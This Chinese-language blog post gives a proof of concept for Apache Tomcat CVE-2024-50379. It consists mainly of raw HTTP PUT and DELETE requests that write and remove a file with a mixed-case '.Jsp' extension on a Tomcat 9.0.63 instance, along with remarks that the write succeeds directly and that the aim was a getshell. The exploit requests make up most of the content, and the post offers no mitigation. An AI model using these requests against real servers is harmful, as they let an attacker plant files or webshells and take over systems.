#  Apache Tomcat CVE-2024-50379   
原创 e0mlja  e0m安全屋   2024-12-18 06:43  
  
poc  
  
一开始说的竞争 只测了一个版本，不需要竞争，直接传  
  
（原本猜测是put上去了会再删除所以需要竞争去get getshell的 测试版本9.0.63不需要 代码也没有看到哪里会有删除文件的操作，朴实无华的put）  
  
文件上传  
```
PUT /dsd.Jsp HTTP/1.1
Host: 127.0.0.1:8080
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Sec-Fetch-Dest: document
Upgrade-Insecure-Requests: 1
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
Priority: u=0, i
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0
Accept-Encoding: gzip, deflate, br, zstd
Cookie: OFBiz.Visitor=10000; uid=11221|1732611643799
Sec-Fetch-Mode: navigate
Content-Length: 14
Connection: keep-alive
123123sssasdad
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/1ndgs74BGMWlIK3IRgNxiasbZxn9iayqu3Z3qzs4lL2PWiayciaBCbxuJBApChbca6w5yDlibNOtL0iceJ8hpECaISPA/640?wx_fmt=png&from=appmsg "")  
  
开启readonly，可以写文件(成功就201新建 或者204覆盖)  
  
![](https://mmbiz.qpic.cn/mmbiz_png/1ndgs74BGMWlIK3IRgNxiasbZxn9iayqu3ULbWPqa3lH1ic9vg5DN49ebDJES8JYlfLjTmice0jhLicPic6m3HtLLeAA/640?wx_fmt=png&from=appmsg "")  
  
文件删除  
```
DELETE /dsd.Jsp HTTP/1.1
Host: 127.0.0.1:8080
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Sec-Fetch-Dest: document
Upgrade-Insecure-Requests: 1
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
Priority: u=0, i
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0
Accept-Encoding: gzip, deflate, br, zstd
Cookie: OFBiz.Visitor=10000; uid=11221|1732611643799
Sec-Fetch-Mode: navigate
Content-Length: 14
Connection: keep-alive
123123sssasdad
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/1ndgs74BGMWlIK3IRgNxiasbZxn9iayqu3CZGKLqpCicIwSjVEia0UnKTsiaVq6PE0FNGCnRnONbhU1yIw4WdH6Q0KA/640?wx_fmt=png&from=appmsg "")  
  
  
原理简单 不再分析  
  
  
